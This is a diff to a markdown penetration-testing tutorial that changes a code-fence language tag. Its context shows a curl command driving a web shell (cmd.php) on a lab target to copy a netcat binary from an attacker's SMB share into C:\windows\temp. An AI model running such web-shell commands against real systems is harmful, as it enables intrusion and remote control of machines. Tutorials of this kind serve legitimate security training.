@@ -168,7 +168,7 @@ copy \\<RHOST>\share\<file name> <copy destination>
 ```
 
 So this is what it would look like to copy over a netcat binary to the target machine:
-```sh
+```
 curl "http://192.168.142.134/cmd.php" --data-urlencode "cmd=copy \\\192.168.142.132\\share\\nc.exe C:\windows\temp\nc.exe"
 ```
 <img src="/images/SMB_COPY.gif" class="center-image" />
